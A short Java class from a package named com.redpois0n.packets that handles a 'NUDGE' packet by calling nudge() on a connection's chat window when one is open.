package com.redpois0n.packets;

import com.redpois0n.Connection;

public class PacketNUDGE extends Packet {

	@Override
	public void read(String line) throws Exception {
		if (Connection.frameChat != null) {
			Connection.frameChat.nudge();
		}
	}

}
